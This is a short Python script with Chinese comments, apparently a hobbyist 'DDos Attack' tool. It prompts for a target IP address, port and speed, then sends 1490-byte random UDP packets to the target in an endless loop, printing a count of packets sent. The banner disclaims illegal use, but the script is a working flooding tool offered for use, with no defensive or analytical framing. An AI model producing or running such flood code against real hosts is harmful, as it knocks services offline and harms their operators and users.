'''

          作者        ： Redstone_hacker
          作者github  :  https://www.github.com/Redsthacker
          团队        ： Redstone_code
          团队github  :  SBLZsoft
          版本        ： v1.0.0
          最后修改时间 ： 2022.12.30 16:35[utc:2022.12.30 8:35]

'''
##########################################################################################

#coding by UTF-8

##########################################################################################
#模块导入
import sys
import os
import time
import socket
import random
from datetime import datetime
##########################################################################################
#宏定义
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
##########################################################################################
#可用可不用
#os.system("clear")
#os.system("figlet DDos Attack")
##########################################################################################
#数据打印部分
print(" ")
print("/----------------------------------------------------\ ")
print("|                                                    |")
print("|       作者      : Redstone_hacker                  |")  
print("|       版本      : V1.0.0                           |")
print("|    作者github   :https://www.github.com/Redsthacker|")
print("|                                                    |")
print("\----------------------------------------------------/")
print(" ")
print(" ")
print(" ----------[仅供学习参考，严禁用于违法用途！]---------- ")
print(" ")
print(" -----------------[违法者与作者无关]----------------- ")
print(" ")
print(" ")
print(" ")
##########################################################################################
#数据输入部分
ip = input("请输入 IP 地址    : ")
port = int(input("攻击端口        : "))
sd = int(input("攻击速度(1~1000) : "))
##########################################################################################
#初始化
os.system("clear")
##########################################################################################
#Dos攻击部分
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     print ("已发送 %s 个数据包到 %s 端口 %d"%(sent,ip,port))
     time.sleep((1000-sd)/2000)
##########################################################################################
